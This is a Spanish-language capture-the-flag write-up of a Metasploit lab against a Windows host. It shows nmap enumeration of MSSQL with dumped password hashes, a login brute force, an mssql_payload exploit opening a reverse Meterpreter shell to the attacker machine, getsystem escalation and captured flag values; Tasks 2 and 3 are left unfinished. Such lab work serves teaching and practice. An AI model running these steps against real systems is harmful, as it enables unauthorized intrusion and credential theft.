
# The Metasploit Framework - CTF 1

Los sistemas Windows son objetivos frecuentes en las pruebas de penetración debido a su amplio uso en entornos corporativos. Este laboratorio se centra en la explotación de servicios y configuraciones basados ​​en Windows mediante Metasploit Framework (MSF). Los participantes adquirirán experiencia práctica accediendo a servicios vulnerables, explorando directorios confidenciales y escalando privilegios para recuperar información oculta.

El objetivo es destacar los riesgos asociados con las cuentas mal configuradas, los directorios expuestos y la gestión inadecuada de privilegios en entornos Windows.

***

## <mark style="color:$primary;">Tarea 1</mark>

> Obtén acceso a la cuenta MSSQLSERVER en la máquina de destino para recuperar la primera flag.

### Target

Nuestro objetivo es `target.ine.local`:

```bash
┌──(root㉿INE)-[~]
└─# cat /etc/hosts

127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.5        INE
127.0.0.1 AttackDefense-Kali
10.10.49.2      INE
10.2.30.41    target.ine.local
```

### Escaneo de puertos

```bash
┌──(root㉿INE)-[~]
└─# nmap -v -sV target.ine.local

PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1433/tcp  open  ms-sql-s           Microsoft SQL Server 2012 11.00.6020; SP3
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
```

Vemos que hay MSSQL por el puerto 1433.

### Enumeración de MSSQL

```bash
┌──(root㉿INE)-[~]
└─# nmap -p 1433 --script ms-sql* target.ine.local

PORT     STATE SERVICE
1433/tcp open  ms-sql-s
|_ms-sql-hasdbaccess: ERROR: Script execution failed (use -d to debug)
| ms-sql-brute: 
|   10.2.30.41\MSSQLSERVER: 
| [10.2.30.41\MSSQLSERVER]
|_  No credentials found
| ms-sql-info: 
|   10.2.30.41\MSSQLSERVER: 
|     Instance name: MSSQLSERVER
|     Version: 
|       name: Microsoft SQL Server 2012 SP3
|       number: 11.00.6020.00
|       Product: Microsoft SQL Server 2012
|       Service pack level: SP3
|       Post-SP patches applied: false
|     TCP port: 1433
|_    Clustered: false
| ms-sql-ntlm-info: 
|   10.2.30.41\MSSQLSERVER: 
|     Target_Name: WIN-5BQ22OKH4SO
|     NetBIOS_Domain_Name: WIN-5BQ22OKH4SO
|     NetBIOS_Computer_Name: WIN-5BQ22OKH4SO
|     DNS_Domain_Name: WIN-5BQ22OKH4SO
|     DNS_Computer_Name: WIN-5BQ22OKH4SO
|_    Product_Version: 6.3.9600
|_ms-sql-config: ERROR: Script execution failed (use -d to debug)
| ms-sql-empty-password: 
|   10.2.30.41\MSSQLSERVER: 
|_    sa:<empty> => Login Success
| ms-sql-dac: 
|   10.2.30.41\MSSQLSERVER: 
|     port: 1434
|     state: closed
|_    error: ERROR
|_ms-sql-tables: ERROR: Script execution failed (use -d to debug)
| ms-sql-dump-hashes: 
|   10.2.30.41\MSSQLSERVER: 
|     sa:0x020056f5245d8dd0f502737b7850ac73e66bac6bb6c82295f6669effdfc14b72f9bbe76205453bceef2815df114806bbc89392d486c8f00a4bcc4a740ac434b7c06b4b6816cb
|     ##MS_PolicyTsqlExecutionLogin##:0x02002e06a796e871a4e41040af6dc0b990d6f6431e413b9193297939f3acf2e302c699144273ea0bbe22af21677d4ae5853755d68eeba3b554bc089cc0a89e723b0763281f27
|_    ##MS_PolicyEventProcessingLogin##:0x020079a919a15927191c167102d7aa99be5dc2fffc67d3d744de4b27a5a74f11def83bcb9da89255f655db083abaa127b76be9f93de50e6526111ce36cad13d47201385f903c
| ms-sql-query: 
|_  (Use --script-args=ms-sql-query.query='<QUERY>' to change query.)
| ms-sql-xp-cmdshell: 
|_  (Use --script-args=ms-sql-xp-cmdshell.cmd='<CMD>' to change command.)

Nmap done: 1 IP address (1 host up) scanned in 356.29 seconds
```

Observamos que tenemos login sin contraseña con el usuario `sa` (sysadmin):

```bash
| ms-sql-empty-password: 
|   10.2.30.41\MSSQLSERVER: 
|_    sa:<empty> => Login Success
```

### **Metasploit MSSQL Login**

Confirmamos que hay login successful con el usuario `sa` (sysadmin):

```bash
msfconsole
use auxiliary/scanner/mssql/mssql_login
set RHOSTS 10.2.30.41
set USER_FILE /usr/share/seclists/Usernames/mssql-usernames-nansh0u-guardicore.txt
set PASS_FILE /root/Desktop/wordlists/100-common-passwords.txt
set VERBOSE false
exploit

[*] 10.2.30.41:1433       - 10.2.30.41:1433 - MSSQL - Starting authentication scanner.
[+] 10.2.30.41:1433       - 10.2.30.41:1433 - Login Successful: WORKSTATION\sa:
[*] 10.2.30.41:1433       - Scanned 1 of 1 hosts (100% complete)
[*] 10.2.30.41:1433       - Bruteforce completed, 1 credential was successful.
[*] 10.2.30.41:1433       - You can open an MSSQL session with these credentials and CreateSession set to true
[*] Auxiliary module execution completed
```

### Explotación de MSSQL <a href="#explotacion-de-mssql" id="explotacion-de-mssql"></a>

```bash
use exploit/windows/mssql/mssql_payload
set RHOSTS 10.2.30.41
set USERNAME sa
set PASSWORD ""
set DATABASE ""
exploit

[*] Started reverse TCP handler on 10.10.49.2:4444 
[*] 10.2.30.41:1433 - Command Stager progress -   1.47% done (1499/102246 bytes)
[*] 10.2.30.41:1433 - Command Stager progress -   2.93% done (2998/102246 bytes)
[*] 10.2.30.41:1433 - Command Stager progress -  96.76% done (98934/102246 bytes)
[*] 10.2.30.41:1433 - Command Stager progress -  98.19% done (100400/102246 bytes)
[*] 10.2.30.41:1433 - Command Stager progress -  99.59% done (101827/102246 bytes)
[*] Sending stage (176198 bytes) to 10.2.30.41
[*] 10.2.30.41:1433 - Command Stager progress - 100.00% done (102246/102246 bytes)
[*] Meterpreter session 1 opened (10.10.49.2:4444 -> 10.2.30.41:49365) at 2026-05-07 00:06:33 +0530

meterpreter > getuid
Server username: NT Service\MSSQLSERVER
```

Accedemos con una cuenta NT Service, y podríamos elevar privilegios a SYSTEM fácilmente con `getsystem`:

```bash
meterpreter > getuid
Server username: NT Service\MSSQLSERVER
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Flag 1

```powershell
meterpreter > ls
Listing: c:\
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
040777/rwxrwxrwx  0       dir   2021-12-15 09:58:20 +0530  $Recycle.Bin
100666/rw-rw-rw-  1       fil   2013-06-18 17:48:29 +0530  BOOTNXT
040777/rwxrwxrwx  0       dir   2013-08-22 20:18:41 +0530  Documents and Settings
040777/rwxrwxrwx  0       dir   2013-08-22 21:22:33 +0530  PerfLogs
040555/r-xr-xr-x  4096    dir   2025-01-09 12:30:38 +0530  Program Files
040777/rwxrwxrwx  4096    dir   2024-12-15 14:57:59 +0530  Program Files (x86)
040777/rwxrwxrwx  4096    dir   2015-08-13 21:42:59 +0530  ProgramData
040777/rwxrwxrwx  0       dir   2021-12-31 13:30:32 +0530  System Volume Information
040555/r-xr-xr-x  4096    dir   2025-01-09 12:42:28 +0530  Users
040777/rwxrwxrwx  24576   dir   2025-01-09 12:38:38 +0530  Windows
100444/r--r--r--  398356  fil   2014-03-18 15:35:18 +0530  bootmgr
100666/rw-rw-rw-  34      fil   2026-05-06 23:50:53 +0530  flag1.txt
000000/---------  0       fif   1970-01-01 05:30:00 +0530  pagefile.sys

meterpreter > cat flag1.txt 
a6717b01d46e435d81f12a60********
```

***

## <mark style="color:$primary;">Tarea 2</mark>

> Localiza la segunda flag dentro de la carpeta de configuración de Windows.

Accedemos a la carpeta de configuración de Windows pero no encontramos la flag 2:

```powershell
meterpreter > cd C:\\Windows\\System32\\config
meterpreter > ls
Listing: C:\Windows\System32\config
===================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2013-08-22 18:55:43 +0530  Journal
040777/rwxrwxrwx  0     dir   2013-08-22 18:55:43 +0530  RegBack
040777/rwxrwxrwx  0     dir   2013-08-22 18:55:43 +0530  TxR
040777/rwxrwxrwx  0     dir   2013-08-22 21:09:31 +0530  systemprofile
```

### Buscar flags en Windows

```powershell
meterpreter > search -d C:\\ -f *flag*
Found 5 results...
==================

Path                                                                                                                                                                                          Size (bytes)  Modified (UTC)
----                                                                                                                                                                                          ------------  --------------
C:\Documents and Settings\Administrator\Desktop\flag4.txt                                                                                                                                     34            2026-05-06 23:50:54 +0530
C:\Program Files (x86)\Microsoft SQL Server\110\Tools\Binn\ManagementStudio\SqlWorkbenchProjectItems\Sql\Change Data Capture\Configuration\Instantiate Wrapper TVF With Update Flag.sql       904           2012-02-10 22:34:08 +0530
C:\Program Files (x86)\Microsoft SQL Server\110\Tools\Binn\ManagementStudio\SqlWorkbenchProjectItems\Sql\Change Data Capture\Enumeration\Get Net Changes Using Wrapper With Update Flags.sql  350           2012-02-10 22:34:08 +0530
C:\Users\Administrator\Desktop\flag4.txt                                                                                                                                                      34            2026-05-06 23:50:54 +0530
C:\flag1.txt                                                                                                                                                                                  34            2026-05-06 23:50:53 +0530
```

```powershell
c:\Windows\System32>dir C:\Windows\System32\*.txt /s /b
dir C:\Windows\System32\*.txt /s /b
C:\Windows\System32\drivers\gmreadme.txt
C:\Windows\System32\en-US\erofflps.txt
C:\Windows\System32\WindowsPowerShell\v1.0\en-US\default.help.txt
C:\Windows\System32\WindowsPowerShell\v1.0\Modules\BitsTransfer\en-US\about_BITS_Cmdlets.help.txt
```

***

## <mark style="color:$primary;">Tarea 3</mark>

> La tercera flag también está oculta en el directorio del sistema. Encuéntrala para descubrir una pista que te permita acceder a la flag final.

***

## <mark style="color:$primary;">Tarea 4</mark>

> Investiga el directorio del administrador para encontrar la cuarta flag.

```
meterpreter > cat 'C:\Users\Administrator\Desktop\flag4.txt'
1580e87c390348ee971a52ae5033e83e
```
